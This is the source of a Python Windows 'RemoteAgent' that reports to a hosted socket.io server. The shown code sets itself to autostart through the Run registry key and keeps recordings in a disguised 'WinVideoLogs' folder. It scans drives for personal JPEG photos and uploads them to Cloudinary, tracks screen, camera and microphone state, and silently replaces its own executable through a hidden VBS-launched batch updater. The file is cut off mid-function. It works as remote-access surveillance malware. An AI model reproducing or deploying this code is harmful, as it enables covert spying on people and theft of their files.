import socketio
import cv2
import numpy as np
import pyautogui
import os
import threading
import base64
import time
import re
import json
import hashlib
import requests
import subprocess
import cloudinary
import cloudinary.uploader
import wave
from datetime import datetime
import sys

try:
    import sounddevice as sd
    sounddevice_import_error = ""
except Exception as error:
    sd = None
    sounddevice_import_error = str(error)

ENV_OVERRIDE_KEYS = {
    "SERVER_URL",
    "CLOUDINARY_CLOUD_NAME",
    "CLOUDINARY_API_KEY",
    "CLOUDINARY_API_SECRET",
    "CLOUDINARY_URL",
    "AGENT_NAME",
    "AGENT_VERSION",
    "AUTO_UPDATE_ENABLED",
    "UPDATE_MANIFEST_URL",
    "UPDATE_CHECK_INTERVAL_SECONDS",
    "UPDATE_DOWNLOAD_RETRY_COUNT",
    "UPDATE_DOWNLOAD_RETRY_DELAY_SECONDS",
    "MIN_UPDATE_BINARY_SIZE_BYTES",
    "AUDIO_SAMPLE_RATE",
    "AUDIO_CHANNELS",
    "AUDIO_BLOCK_FRAMES",
    "IMAGE_SYNC_BATCH_UPLOAD_LIMIT",
    "IMAGE_SCAN_IGNORE_DRIVES",
}

try:
    import winreg
except ImportError:
    winreg = None

BASE_DIR = os.path.dirname(sys.executable) if getattr(sys, "frozen", False) else os.path.dirname(__file__)
LOG_FILE = os.path.join(BASE_DIR, "socket_error.txt")
AGENT_VERSION_FILE_NAME = "AGENT_VERSION.txt"
AGENT_VERSION_FILE_PATH = os.path.join(BASE_DIR, AGENT_VERSION_FILE_NAME)
EMBEDDED_VERSION_FILE_NAME = "AGENT_VERSION_BUILD.txt"
RUN_REGISTRY_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
RUN_REGISTRY_NAME = "RemoteAgent"

def log_error(message):
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as file:
            file.write(f"{datetime.now()}: {message}\n")
    except Exception:
        return


def load_local_env():
    meipass_dir = getattr(sys, "_MEIPASS", None)
    appdata_dir = os.getenv("APPDATA")
    env_candidates = [
        os.path.join(meipass_dir, ".env") if meipass_dir else None,
        os.path.join(BASE_DIR, ".env"),
        os.path.join(os.path.dirname(BASE_DIR), ".env"),
        os.path.join(appdata_dir, "RemoteAgent", ".env") if appdata_dir else None,
        os.path.join(os.path.expanduser("~"), ".remote-agent.env"),
        os.path.join(os.getcwd(), ".env"),
    ]

    loaded_paths = []

    for env_path in env_candidates:
        if not env_path:
            continue
        if not os.path.exists(env_path):
            continue

        try:
            loaded_any_key = False
            with open(env_path, "r", encoding="utf-8") as file:
                for line in file:
                    raw = line.strip()
                    if not raw or raw.startswith("#") or "=" not in raw:
                        continue
                    key, value = raw.split("=", 1)
                    parsed_key = key.strip()
                    parsed_value = value.strip().strip('"').strip("'")
                    if parsed_key in ENV_OVERRIDE_KEYS:
                        os.environ[parsed_key] = parsed_value
                    else:
                        os.environ.setdefault(parsed_key, parsed_value)
                    loaded_any_key = True

            if loaded_any_key:
                loaded_paths.append(env_path)
        except Exception as error:
            log_error(f"Failed to load .env from {env_path}: {error}")

    if loaded_paths:
        log_error("Loaded environment from: " + " | ".join(loaded_paths))
    else:
        log_error("No .env file found in known locations")


def load_agent_version_from_file():
    version_candidates = [
        AGENT_VERSION_FILE_PATH,
        os.path.join(os.path.dirname(BASE_DIR), AGENT_VERSION_FILE_NAME),
    ]

    for version_path in version_candidates:
        if not os.path.exists(version_path):
            continue

        try:
            with open(version_path, "r", encoding="utf-8") as file:
                version_value = file.read().strip()
                if version_value:
                    return version_value, version_path
        except Exception as error:
            log_error(f"Failed to read agent version file {version_path}: {error}")

    return "", ""


def load_embedded_agent_version():
    meipass_dir = getattr(sys, "_MEIPASS", None)
    version_candidates = [
        os.path.join(meipass_dir, EMBEDDED_VERSION_FILE_NAME) if meipass_dir else None,
        os.path.join(BASE_DIR, EMBEDDED_VERSION_FILE_NAME),
        os.path.join(os.path.dirname(BASE_DIR), EMBEDDED_VERSION_FILE_NAME),
    ]

    for version_path in version_candidates:
        if not version_path:
            continue
        if not os.path.exists(version_path):
            continue

        try:
            with open(version_path, "r", encoding="utf-8") as file:
                version_value = file.read().strip()
                if version_value:
                    return version_value, version_path
        except Exception as error:
            log_error(f"Failed to read embedded agent version file {version_path}: {error}")

    return "", ""


def get_canonical_packaged_exe_path():
    if not getattr(sys, "frozen", False):
        return ""

    current_exe = os.path.abspath(sys.executable)
    current_dir = os.path.dirname(current_exe)
    canonical_exe = os.path.join(current_dir, "RemoteAgent.exe")

    if os.path.basename(current_exe).lower() == "remoteagent.exe":
        return current_exe
    if os.path.exists(canonical_exe):
        return canonical_exe
    return current_exe


def get_autostart_command():
    if getattr(sys, "frozen", False):
        return f'"{get_canonical_packaged_exe_path()}"'

    script_path = os.path.abspath(__file__)
    return f'"{sys.executable}" "{script_path}"'


def ensure_autostart_enabled():
    if os.name != "nt" or winreg is None:
        return

    launch_command = get_autostart_command()

    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, RUN_REGISTRY_PATH, 0, winreg.KEY_READ) as key:
            existing_command, _ = winreg.QueryValueEx(key, RUN_REGISTRY_NAME)
            if existing_command == launch_command:
                return
    except OSError:
        pass

    try:
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, RUN_REGISTRY_PATH) as key:
            winreg.SetValueEx(key, RUN_REGISTRY_NAME, 0, winreg.REG_SZ, launch_command)
        log_error(f"Autostart enabled with command: {launch_command}")
    except Exception as error:
        log_error(f"Failed to enable autostart: {error}")


def terminate_stale_agent_instances():
    if os.name != "nt" or not getattr(sys, "frozen", False):
        return

    current_pid = os.getpid()
    image_name = os.path.basename(sys.executable)

    try:
        flags = getattr(subprocess, "CREATE_NO_WINDOW", 0)
        result = subprocess.run(
            [
                "taskkill",
                "/F",
                "/T",
                "/FI",
                f"IMAGENAME eq {image_name}",
                "/FI",
                f"PID ne {current_pid}",
            ],
            capture_output=True,
            text=True,
            creationflags=flags,
        )

        output = " ".join(part.strip() for part in [result.stdout, result.stderr] if part and part.strip())
        if result.returncode == 0:
            log_error(f"Terminated stale {image_name} instances (excluding PID {current_pid})")
        elif output and "No tasks are running" not in output:
            log_error(f"Stale instance cleanup skipped (code={result.returncode}): {output}")
    except Exception as error:
        log_error(f"Failed to cleanup stale agent instances: {error}")


load_local_env()
ensure_autostart_enabled()

# --- CONFIGURATION ---
DEFAULT_SERVER_URL = "https://remote-agent-node.onrender.com"
SERVER_URL = os.getenv("SERVER_URL", DEFAULT_SERVER_URL)
RECORDING_DIR = os.path.join(os.getenv("APPDATA", os.getcwd()), "WinVideoLogs")
IMAGE_SYNC_DIR = os.path.join(os.getenv("APPDATA", BASE_DIR), "RemoteAgent")
IMAGE_SYNC_STATE_FILE = os.path.join(IMAGE_SYNC_DIR, "image_sync_state.json")
FPS = 8.0
RECONNECT_DELAY_SECONDS = 5
IMAGE_SYNC_RETRY_DELAY_SECONDS = 5
IMAGE_EXTENSIONS = {".jpg", ".jpeg"}
try:
    IMAGE_SYNC_BATCH_UPLOAD_LIMIT = max(1, int(os.getenv("IMAGE_SYNC_BATCH_UPLOAD_LIMIT", "10")))
except ValueError:
    IMAGE_SYNC_BATCH_UPLOAD_LIMIT = 10
IMAGE_SCAN_IGNORE_DRIVES = {
    drive.strip().upper().replace(":", "")
    for drive in os.getenv("IMAGE_SCAN_IGNORE_DRIVES", "C").split(",")
    if drive and drive.strip()
}
IMAGE_SCAN_IGNORED_DIR_NAMES = {
    "windows",
    "program files",
    "program files (x86)",
    "programdata",
    "$recycle.bin",
    "system volume information",
    "recovery",
    "perflogs",
}
IMAGE_SCAN_IGNORED_DIR_KEYWORDS = {
    "software",
    "windows",
    "program files",
}
try:
    AUDIO_SAMPLE_RATE = max(8000, int(os.getenv("AUDIO_SAMPLE_RATE", "16000")))
except ValueError:
    AUDIO_SAMPLE_RATE = 16000

try:
    AUDIO_CHANNELS = max(1, int(os.getenv("AUDIO_CHANNELS", "1")))
except ValueError:
    AUDIO_CHANNELS = 1

try:
    AUDIO_BLOCK_FRAMES = max(256, int(os.getenv("AUDIO_BLOCK_FRAMES", "1024")))
except ValueError:
    AUDIO_BLOCK_FRAMES = 1024
CLOUDINARY_CLOUD_NAME = os.getenv("CLOUDINARY_CLOUD_NAME")
CLOUDINARY_API_KEY = os.getenv("CLOUDINARY_API_KEY")
CLOUDINARY_API_SECRET = os.getenv("CLOUDINARY_API_SECRET")
CLOUDINARY_URL = os.getenv("CLOUDINARY_URL")
MACHINE_NAME = os.getenv("AGENT_NAME") or os.getenv("COMPUTERNAME", "Unknown-PC")
embedded_agent_version, embedded_agent_version_source = load_embedded_agent_version()
agent_version_from_file, agent_version_source = load_agent_version_from_file()
agent_version_from_env = os.getenv("AGENT_VERSION", "").strip()
AGENT_VERSION = embedded_agent_version or agent_version_from_env or agent_version_from_file or "1.0.0"
UPDATE_MANIFEST_URL = os.getenv("UPDATE_MANIFEST_URL")

auto_update_raw = os.getenv("AUTO_UPDATE_ENABLED", "true").strip().lower()
AUTO_UPDATE_ENABLED = auto_update_raw not in {"0", "false", "no", "off"}
try:
    UPDATE_CHECK_INTERVAL_SECONDS = max(60, int(os.getenv("UPDATE_CHECK_INTERVAL_SECONDS", "3600")))
except ValueError:
    UPDATE_CHECK_INTERVAL_SECONDS = 3600
try:
    UPDATE_DOWNLOAD_RETRY_COUNT = max(1, int(os.getenv("UPDATE_DOWNLOAD_RETRY_COUNT", "3")))
except ValueError:
    UPDATE_DOWNLOAD_RETRY_COUNT = 3
try:
    UPDATE_DOWNLOAD_RETRY_DELAY_SECONDS = max(1, int(os.getenv("UPDATE_DOWNLOAD_RETRY_DELAY_SECONDS", "2")))
except ValueError:
    UPDATE_DOWNLOAD_RETRY_DELAY_SECONDS = 2
try:
    MIN_UPDATE_BINARY_SIZE_BYTES = max(64 * 1024, int(os.getenv("MIN_UPDATE_BINARY_SIZE_BYTES", "524288")))
except ValueError:
    MIN_UPDATE_BINARY_SIZE_BYTES = 524288

# Cloudinary Setup (Get these from your Cloudinary Dashboard)
CLOUDINARY_READY = False

if CLOUDINARY_URL:
    cloudinary.config(cloudinary_url=CLOUDINARY_URL)
    CLOUDINARY_READY = True
    log_error("Cloudinary configured using CLOUDINARY_URL")
elif CLOUDINARY_CLOUD_NAME and CLOUDINARY_API_KEY and CLOUDINARY_API_SECRET:
    cloudinary.config(
        cloud_name=CLOUDINARY_CLOUD_NAME,
        api_key=CLOUDINARY_API_KEY,
        api_secret=CLOUDINARY_API_SECRET
    )
    CLOUDINARY_READY = True
    log_error(f"Cloudinary configured for cloud: {CLOUDINARY_CLOUD_NAME}")
else:
    missing_keys = []
    if not CLOUDINARY_CLOUD_NAME:
        missing_keys.append("CLOUDINARY_CLOUD_NAME")
    if not CLOUDINARY_API_KEY:
        missing_keys.append("CLOUDINARY_API_KEY")
    if not CLOUDINARY_API_SECRET:
        missing_keys.append("CLOUDINARY_API_SECRET")
    log_error("Cloudinary credentials are not configured at startup. Missing: " + ", ".join(missing_keys))

if sd is None:
    log_error(f"sounddevice import unavailable. Voice recording disabled: {sounddevice_import_error}")
# ---------------------

sio = socketio.Client(reconnection=True, reconnection_attempts=0, reconnection_delay=2, reconnection_delay_max=10)
is_recording = False
is_camera_on = False
is_voice_recording = False
recording_lock = threading.Lock()
camera_lock = threading.Lock()
voice_lock = threading.Lock()
image_sync_lock = threading.Lock()
update_lock = threading.Lock()
update_last_checked_at = 0
update_in_progress = False
is_image_sync_running = False
image_sync_thread = None
image_sync_stop_event = threading.Event()
image_sync_reset_requested = False
image_sync_reset_clear_hashes_requested = False

if not os.path.exists(RECORDING_DIR):
    os.makedirs(RECORDING_DIR)

if not os.path.exists(IMAGE_SYNC_DIR):
    os.makedirs(IMAGE_SYNC_DIR)


def emit_agent_state(source=""):
    try:
        sio.emit('agent_state_update', {
            'recording': bool(is_recording),
            'cameraOn': bool(is_camera_on),
            'voiceRecording': bool(is_voice_recording),
            'machine': MACHINE_NAME,
            'source': source,
            'timestamp': int(time.time() * 1000)
        })
    except Exception as error:
        log_error(f"Failed to emit agent state ({source}): {error}")


def emit_update_state(stage, details=None):
    payload = {
        'machine': MACHINE_NAME,
        'stage': stage,
        'currentVersion': AGENT_VERSION,
        'timestamp': int(time.time() * 1000),
    }
    if details:
        payload.update(details)

    try:
        sio.emit('agent_update_status', payload)
    except Exception as error:
        log_error(f"Failed to emit update state ({stage}): {error}")


def emit_image_sync_state(stage, details=None):
    payload = {
        'machine': MACHINE_NAME,
        'stage': stage,
        'timestamp': int(time.time() * 1000),
    }
    if details:
        payload.update(details)

    try:
        sio.emit('image_sync_status', payload)
    except Exception as error:
        log_error(f"Failed to emit image sync state ({stage}): {error}")


def load_image_sync_state():
    default_state = {
        'pendingFiles': [],
        'nextIndex': 0,
        'uploadedHashes': [],
    }

    if not os.path.exists(IMAGE_SYNC_STATE_FILE):
        return default_state

    try:
        with open(IMAGE_SYNC_STATE_FILE, "r", encoding="utf-8") as file:
            state = json.load(file)
    except Exception as error:
        log_error(f"Failed to read image sync state: {error}")
        return default_state

    pending_files = state.get('pendingFiles', [])
    if not isinstance(pending_files, list):
        pending_files = []

    uploaded_hashes = state.get('uploadedHashes', [])
    if not isinstance(uploaded_hashes, list):
        uploaded_hashes = []

    try:
        next_index = int(state.get('nextIndex', 0))
    except (TypeError, ValueError):
        next_index = 0

    next_index = max(0, min(next_index, len(pending_files)))

    return {
        'pendingFiles': pending_files,
        'nextIndex': next_index,
        'uploadedHashes': [str(item) for item in uploaded_hashes if item],
    }


def save_image_sync_state(pending_files, next_index, uploaded_hashes):
    safe_pending_files = pending_files if isinstance(pending_files, list) else []
    try:
        parsed_next_index = int(next_index or 0)
    except (TypeError, ValueError):
        parsed_next_index = 0
    safe_next_index = max(0, min(parsed_next_index, len(safe_pending_files)))
    safe_uploaded_hashes = list(uploaded_hashes) if isinstance(uploaded_hashes, (list, set, tuple)) else []
    state = {
        'pendingFiles': safe_pending_files,
        'nextIndex': safe_next_index,
        'uploadedHashes': safe_uploaded_hashes,
        'updatedAt': int(time.time()),
    }

    temp_path = IMAGE_SYNC_STATE_FILE + ".tmp"
    try:
        with open(temp_path, "w", encoding="utf-8") as file:
            json.dump(state, file, ensure_ascii=False)
        os.replace(temp_path, IMAGE_SYNC_STATE_FILE)
    except Exception as error:
        log_error(f"Failed to save image sync state: {error}")
        try:
            if os.path.exists(temp_path):
                os.remove(temp_path)
        except OSError:
            pass


def get_windows_drive_roots():
    if os.name != "nt":
        return ["/"]

    roots = []
    for letter in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
        if letter in IMAGE_SCAN_IGNORE_DRIVES:
            continue
        drive_root = f"{letter}:\\"
        if os.path.exists(drive_root):
            roots.append(drive_root)
    return roots


def should_ignore_path_segment(segment):
    normalized = str(segment or "").strip().lower()
    if not normalized:
        return False

    if normalized in IMAGE_SCAN_IGNORED_DIR_NAMES:
        return True

    for keyword in IMAGE_SCAN_IGNORED_DIR_KEYWORDS:
        if keyword in normalized:
            return True

    return False


def collect_device_image_files():
    image_files = []
    for drive_root in get_windows_drive_roots():
        try:
            for root, dirs, files in os.walk(drive_root, topdown=True):
                dirs[:] = [directory for directory in dirs if not should_ignore_path_segment(directory)]

                root_parts = re.split(r"[\\/]+", root)
                if any(should_ignore_path_segment(part) for part in root_parts):
                    continue

                for file_name in files:
                    extension = os.path.splitext(file_name)[1].lower()
                    if extension in IMAGE_EXTENSIONS:
                        full_path = os.path.join(root, file_name)
                        path_parts = re.split(r"[\\/]+", full_path)
                        if any(should_ignore_path_segment(part) for part in path_parts):
                            continue
                        image_files.append(full_path)
        except Exception as error:
            log_error(f"Image scan error on {drive_root}: {error}")

    image_files.sort(key=lambda path: path.lower())
    return image_files


def compute_file_sha256(file_path):
    digest = hashlib.sha256()
    with open(file_path, "rb") as file:
        while True:
            chunk = file.read(1024 * 1024)
            if not chunk:
                break
            digest.update(chunk)
    return digest.hexdigest().lower()


def upload_image_to_cloudinary(file_path):
    response = cloudinary.uploader.upload(file_path, resource_type="image")
    image_url = response.get("secure_url") or response.get("url")
    if not image_url:
        raise RuntimeError("Cloudinary response missing image URL")
    return image_url


def has_pending_image_sync_work():
    state = load_image_sync_state()
    pending_files = state.get('pendingFiles', [])
    next_index = state.get('nextIndex', 0)
    return bool(pending_files) and next_index < len(pending_files)


def get_image_sync_snapshot():
    state = load_image_sync_state()
    pending_files = state.get('pendingFiles', [])
    next_index = state.get('nextIndex', 0)
    total_files = len(pending_files)
    remaining_files = max(0, total_files - next_index)
    return {
        'machine': MACHINE_NAME,
        'running': bool(is_image_sync_running),
        'nextIndex': next_index,
        'totalFiles': total_files,
        'remainingFiles': remaining_files,
        'timestamp': int(time.time() * 1000),
    }


def emit_image_sync_snapshot(event_name='image_sync_snapshot'):
    try:
        sio.emit(event_name, get_image_sync_snapshot())
    except Exception as error:
        log_error(f"Failed to emit image sync snapshot ({event_name}): {error}")


def image_sync_worker(force_rescan=False, trigger_source="admin"):
    global is_image_sync_running
    global image_sync_thread
    global image_sync_reset_requested
    global image_sync_reset_clear_hashes_requested

    try:
        state = load_image_sync_state()
        pending_files = state.get('pendingFiles', [])
        next_index = state.get('nextIndex', 0)
        uploaded_hashes = set(state.get('uploadedHashes', []))

        if force_rescan or not pending_files or next_index >= len(pending_files):
            emit_image_sync_state('scanning', {'trigger': trigger_source})
            pending_files = collect_device_image_files()
            next_index = 0
            save_image_sync_state(pending_files, next_index, uploaded_hashes)

        total_files = len(pending_files)
        uploaded_in_batch = 0
        batch_pause_reached = False
        emit_image_sync_state('started', {
            'trigger': trigger_source,
            'totalFiles': total_files,
            'resumeIndex': next_index,
            'batchLimit': IMAGE_SYNC_BATCH_UPLOAD_LIMIT,
        })

        if total_files == 0:
            emit_image_sync_state('completed', {
                'trigger': trigger_source,
                'totalFiles': 0,
                'uploadedCount': 0,
            })
            save_image_sync_state([], 0, uploaded_hashes)
            return

        while next_index < total_files and not image_sync_stop_event.is_set():
            while not image_sync_stop_event.is_set() and not sio.connected:
                time.sleep(RECONNECT_DELAY_SECONDS)

            if image_sync_stop_event.is_set():
                break

            file_path = pending_files[next_index]

            if not os.path.exists(file_path):
                next_index += 1
                save_image_sync_state(pending_files, next_index, uploaded_hashes)
                continue

            try:
                file_hash = compute_file_sha256(file_path)
            except Exception as error:
                log_error(f"Image hash failed ({file_path}): {error}")
                next_index += 1
                save_image_sync_state(pending_files, next_index, uploaded_hashes)
                continue

            if file_hash in uploaded_hashes:
                next_index += 1
                save_image_sync_state(pending_files, next_index, uploaded_hashes)
                continue

            try:
                image_url = upload_image_to_cloudinary(file_path)
                uploaded_hashes.add(file_hash)
                next_index += 1
                save_image_sync_state(pending_files, next_index, uploaded_hashes)
                sio.emit('image_upload_complete', {
                    'machine': MACHINE_NAME,
                    'url': image_url,
                    'filePath': file_path,
                    'index': next_index,
                    'total': total_files,
                    'mediaType': 'image',
                })
                uploaded_in_batch += 1

                if uploaded_in_batch >= IMAGE_SYNC_BATCH_UPLOAD_LIMIT:
                    batch_pause_reached = True
                    break
            except Exception as error:
                log_error(f"Image upload failed ({file_path}): {error}")
                emit_image_sync_state('retrying', {
                    'trigger': trigger_source,
                    'filePath': file_path,
                    'index': next_index,
                    'totalFiles': total_files,
                    'error': str(error),
                })
                # Skip permanently failed files so one bad upload cannot stall the whole sync queue.
                next_index += 1
                save_image_sync_state(pending_files, next_index, uploaded_hashes)
                time.sleep(IMAGE_SYNC_RETRY_DELAY_SECONDS)

        if image_sync_stop_event.is_set():
            reset_requested = False
            clear_hashes_requested = False
            with image_sync_lock:
                if image_sync_reset_requested:
                    reset_requested = True
                    image_sync_reset_requested = False
                    clear_hashes_requested = image_sync_reset_clear_hashes_requested
                    image_sync_reset_clear_hashes_requested = False

            if reset_requested:
                if clear_hashes_requested:
                    uploaded_hashes = set()
                save_image_sync_state([], 0, uploaded_hashes)
                emit_image_sync_state('reset', {
                    'trigger': trigger_source,
                    'nextIndex': 0,
                    'totalFiles': 0,
                    'clearedUploadedHashes': bool(clear_hashes_requested),
                })
            else:
                save_image_sync_state(pending_files, next_index, uploaded_hashes)
                emit_image_sync_state('stopped', {
                    'trigger': trigger_source,
                    'nextIndex': next_index,
                    'totalFiles': total_files,
                })
        elif batch_pause_reached:
            save_image_sync_state(pending_files, next_index, uploaded_hashes)
            emit_image_sync_state('paused', {
                'trigger': trigger_source,
                'reason': 'batch_limit_reached',
                'batchLimit': IMAGE_SYNC_BATCH_UPLOAD_LIMIT,
                'uploadedInBatch': uploaded_in_batch,
                'nextIndex': next_index,
                'totalFiles': total_files,
            })
        else:
            save_image_sync_state([], 0, uploaded_hashes)
            emit_image_sync_state('completed', {
                'trigger': trigger_source,
                'totalFiles': total_files,
                'uploadedCount': next_index,
            })
    except Exception as error:
        log_error(f"Image sync worker error: {error}")
        emit_image_sync_state('failed', {
            'trigger': trigger_source,
            'error': str(error),
        })
    finally:
        with image_sync_lock:
            is_image_sync_running = False
            image_sync_thread = None


def start_image_sync(force_rescan=False, trigger_source="admin"):
    global is_image_sync_running
    global image_sync_thread
    global image_sync_reset_requested
    global image_sync_reset_clear_hashes_requested

    if not CLOUDINARY_READY:
        emit_image_sync_state('failed', {
            'trigger': trigger_source,
            'error': 'cloudinary_not_configured',
        })
        return False

    with image_sync_lock:
        if is_image_sync_running:
            emit_image_sync_state('already_running', {'trigger': trigger_source})
            return False

        image_sync_stop_event.clear()
        image_sync_reset_requested = False
        image_sync_reset_clear_hashes_requested = False
        is_image_sync_running = True
        image_sync_thread = threading.Thread(
            target=image_sync_worker,
            args=(bool(force_rescan), trigger_source),
            daemon=True,
        )
        image_sync_thread.start()
    return True


def stop_image_sync(trigger_source="admin"):
    if not is_image_sync_running:
        emit_image_sync_state('idle', {'trigger': trigger_source})
        return False

    image_sync_stop_event.set()
    emit_image_sync_state('stopping', {'trigger': trigger_source})
    return True


def reset_image_sync(trigger_source="admin", clear_uploaded_hashes=False):
    global image_sync_reset_requested
    global image_sync_reset_clear_hashes_requested

    state = load_image_sync_state()
    uploaded_hashes = [] if clear_uploaded_hashes else state.get('uploadedHashes', [])

    with image_sync_lock:
        if is_image_sync_running:
            image_sync_reset_requested = True
            image_sync_reset_clear_hashes_requested = bool(clear_uploaded_hashes)
            image_sync_stop_event.set()
            emit_image_sync_state('resetting', {'trigger': trigger_source})
            return True

    save_image_sync_state([], 0, uploaded_hashes)
    emit_image_sync_state('reset', {
        'trigger': trigger_source,
        'nextIndex': 0,
        'totalFiles': 0,
        'clearedUploadedHashes': bool(clear_uploaded_hashes),
    })
    return True


def version_to_tuple(version_value):
    parts = re.findall(r"\d+", str(version_value or "0"))
    if not parts:
        return (0,)
    return tuple(int(part) for part in parts)


def is_newer_version(current_version, candidate_version):
    current = list(version_to_tuple(current_version))
    candidate = list(version_to_tuple(candidate_version))
    max_len = max(len(current), len(candidate))
    current.extend([0] * (max_len - len(current)))
    candidate.extend([0] * (max_len - len(candidate)))
    return tuple(candidate) > tuple(current)


def fetch_update_manifest():
    if not UPDATE_MANIFEST_URL:
        return None

    response = requests.get(UPDATE_MANIFEST_URL, timeout=15)
    response.raise_for_status()

    try:
        manifest = response.json()
    except json.JSONDecodeError as error:
        raise RuntimeError(f"Invalid update manifest JSON: {error}") from error

    version = str(manifest.get("version", "")).strip()
    download_url = str(manifest.get("url") or manifest.get("downloadUrl") or "").strip()
    sha256 = str(manifest.get("sha256") or "").strip().lower()
    size_raw = manifest.get("size")
    if size_raw is None:
        size_raw = manifest.get("fileSize")
    if size_raw is None:
        size_raw = manifest.get("contentLength")

    expected_size = 0
    if size_raw not in (None, ""):
        try:
            expected_size = int(str(size_raw).strip())
            if expected_size < 0:
                expected_size = 0
        except (TypeError, ValueError):
            expected_size = 0
            log_error(f"Update manifest has invalid size value: {size_raw}")

    if sha256 and not re.fullmatch(r"[0-9a-f]{64}", sha256):
        log_error("Update manifest SHA256 format invalid; continuing without SHA256 validation")
        sha256 = ""

    if not version:
        raise RuntimeError("Update manifest missing 'version'")
    if not download_url:
        raise RuntimeError("Update manifest missing 'url'")

    return {
        'version': version,
        'url': download_url,
        'sha256': sha256,
        'size': expected_size,
    }


def compute_sha256(file_path):
    digest = hashlib.sha256()
    with open(file_path, "rb") as file:
        while True:
            chunk = file.read(1024 * 1024)
            if not chunk:
                break
            digest.update(chunk)
    return digest.hexdigest().lower()


def validate_update_binary(file_path, expected_sha256="", expected_size=0):
    file_size = os.path.getsize(file_path)
    if file_size <= 0:
        raise RuntimeError("Downloaded update file is empty")

    if expected_size and file_size != expected_size:
        raise RuntimeError(f"Downloaded update size mismatch. expected={expected_size} actual={file_size}")

    if file_size < MIN_UPDATE_BINARY_SIZE_BYTES:
        raise RuntimeError(
            f"Downloaded update is too small to be a valid executable ({file_size} bytes)"
        )

    with open(file_path, "rb") as file:
        mz_header = file.read(2)
    if mz_header != b"MZ":
        raise RuntimeError("Downloaded update is not a valid Windows executable (MZ header missing)")

    if expected_sha256:
        actual_sha256 = compute_sha256(file_path)
        if actual_sha256 != expected_sha256:
            raise RuntimeError(f"SHA256 mismatch. expected={expected_sha256} actual={actual_sha256}")


def download_update_binary(download_url, expected_sha256="", expected_size=0):
    updates_dir = os.path.join(os.getenv("APPDATA", BASE_DIR), "RemoteAgent", "updates")
    os.makedirs(updates_dir, exist_ok=True)

    update_tag = f"{int(time.time())}_{os.getpid()}"
    temp_file = os.path.join(updates_dir, f"RemoteAgent_update_{update_tag}.exe")
    part_file = temp_file + ".part"
    last_error = None

    for attempt in range(1, UPDATE_DOWNLOAD_RETRY_COUNT + 1):
        downloaded_bytes = 0
        content_length = 0

        try:
            for stale_file in (part_file, temp_file):
                if os.path.exists(stale_file):
                    os.remove(stale_file)

            with requests.get(download_url, stream=True, timeout=(15, 180), allow_redirects=True) as response:
                response.raise_for_status()
                content_length_header = str(response.headers.get("Content-Length") or "").strip()
                if content_length_header.isdigit():
                    content_length = int(content_length_header)

                with open(part_file, "wb") as file:
                    for chunk in response.iter_content(chunk_size=1024 * 1024):
                        if not chunk:
                            continue
                        file.write(chunk)
                        downloaded_bytes += len(chunk)

            if downloaded_bytes <= 0:
                raise RuntimeError("Downloaded zero bytes")
            if content_length and downloaded_bytes != content_length:
                raise RuntimeError(
                    f"Incomplete download. expected={content_length} downloaded={downloaded_bytes}"
                )

            os.replace(part_file, temp_file)
            validate_update_binary(temp_file, expected_sha256=expected_sha256, expected_size=expected_size)
            return temp_file
        except Exception as error:
            last_error = error
            log_error(f"Update download attempt {attempt}/{UPDATE_DOWNLOAD_RETRY_COUNT} failed: {error}")
            for stale_file in (part_file, temp_file):
                try:
                    if os.path.exists(stale_file):
                        os.remove(stale_file)
                except OSError:
                    pass

            if attempt < UPDATE_DOWNLOAD_RETRY_COUNT:
                time.sleep(UPDATE_DOWNLOAD_RETRY_DELAY_SECONDS * attempt)

    raise RuntimeError(
        f"Failed to download valid update after {UPDATE_DOWNLOAD_RETRY_COUNT} attempts: {last_error}"
    )


def launch_windows_updater(new_exe_path, target_version):
    current_exe = os.path.abspath(sys.executable)
    target_exe = get_canonical_packaged_exe_path() or current_exe
    current_image_name = os.path.basename(current_exe)
    target_image_name = os.path.basename(target_exe)
    current_pid = os.getpid()
    updates_dir = os.path.dirname(new_exe_path)
    update_id = int(time.time())
    updater_script_path = os.path.join(updates_dir, f"agent_updater_{update_id}.bat")
    updater_vbs_path = os.path.join(updates_dir, f"agent_updater_{update_id}.vbs")
    backup_exe = target_exe + ".old"
    version_file_path = os.path.join(os.path.dirname(target_exe), AGENT_VERSION_FILE_NAME)

    script_content = f"""@echo off
setlocal
set \"TARGET={target_exe}\"
set \"NEW={new_exe_path}\"
set \"BACKUP={backup_exe}\"
set \"CURRENT_IMAGE_NAME={current_image_name}\"
set \"TARGET_IMAGE_NAME={target_image_name}\"
set \"PID={current_pid}\"
set \"VERSION_FILE={version_file_path}\"
set \"UPDATER_VBS={updater_vbs_path}\"

for /L %%I in (1,1,60) do (
  tasklist /FI \"PID eq %PID%\" | find \"%PID%\" >nul
  if errorlevel 1 goto :PROCESS_EXITED
  timeout /t 1 /nobreak >nul
)

:PROCESS_EXITED
taskkill /F /IM "%CURRENT_IMAGE_NAME%" /T >nul 2>&1
taskkill /F /IM "%TARGET_IMAGE_NAME%" /T >nul 2>&1
taskkill /F /IM "RemoteAgent_*.exe" /T >nul 2>&1
timeout /t 1 /nobreak >nul

if exist \"%BACKUP%\" del /F /Q \"%BACKUP%\" >nul 2>&1
if exist \"%TARGET%\" move /Y \"%TARGET%\" \"%BACKUP%\" >nul
move /Y \"%NEW%\" \"%TARGET%\" >nul
if errorlevel 1 goto :ROLLBACK

> \"%VERSION_FILE%\" echo {target_version}
start \"\" \"%TARGET%\"
timeout /t 3 /nobreak >nul
tasklist /FI \"IMAGENAME eq %TARGET_IMAGE_NAME%\" | find /I \"%TARGET_IMAGE_NAME%\" >nul
if errorlevel 1 goto :ROLLBACK

if exist \"%BACKUP%\" del /F /Q \"%BACKUP%\" >nul 2>&1
if exist \"%UPDATER_VBS%\" del /F /Q \"%UPDATER_VBS%\" >nul 2>&1
del /F /Q \"%~f0\" >nul 2>&1
exit /b 0

:ROLLBACK
if exist \"%BACKUP%\" move /Y \"%BACKUP%\" \"%TARGET%\" >nul
start \"\" \"%TARGET%\"
if exist \"%UPDATER_VBS%\" del /F /Q \"%UPDATER_VBS%\" >nul 2>&1
del /F /Q \"%~f0\" >nul 2>&1
exit /b 1
"""

    with open(updater_script_path, "w", encoding="utf-8", newline="\r\n") as file:
        file.write(script_content)

    vbs_content = f'''Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "cmd /c \"\"{updater_script_path}\"\"", 0, False
'''
    with open(updater_vbs_path, "w", encoding="utf-8", newline="\r\n") as file:
